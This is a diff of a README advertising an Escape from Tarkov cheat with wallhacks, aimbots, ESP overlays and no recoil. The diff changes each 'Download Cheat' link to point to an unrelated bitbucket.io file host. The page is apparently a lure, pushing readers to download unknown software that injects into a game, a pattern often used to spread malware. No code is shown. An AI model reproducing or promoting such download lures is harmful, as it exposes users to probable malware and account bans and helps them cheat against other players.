@@ -2,7 +2,7 @@
 
 **Tired of being clapped by chads with thermal scopes? Want to turn Tarkov into your personal loot farm? With the right Tarkov cheat setup, you’ll dominate raids with wallhacks, no recoil, ESP overlays, and aimbots that lock onto skulls instantly.**
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload20.bitbucket.io)
 ---
 
 ## 💡 What Is a Tarkov Cheat?
@@ -11,7 +11,7 @@ A **Tarkov cheat** is a third-party tool that injects features into your EFT ses
 
 Whether you’re going solo in Factory or running labs with squad wipes in mind — Tarkov cheats can make you untouchable and fully loaded.
 
-[![Download Cheat](https://repository-images.githubusercontent.com/890160686/109fd56a-3c74-4618-961c-8f7c13512d66)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Cheat](https://repository-images.githubusercontent.com/890160686/109fd56a-3c74-4618-961c-8f7c13512d66)](https://fileoffload20.bitbucket.io)
 ---
 
 ## 🔥 Tarkov Cheat Features
@@ -96,3 +96,4 @@ tarkov cheat, escape from tarkov wallhack, eft aimbot cheat, tarkov esp overlay,
 ---
 
 **Escape? Nah. You *own* Tarkov now.** Get the vision, precision, and power to run every raid like a boss. Just don’t get greedy — this game bites back. 💼🔫👁️‍🗨️
+
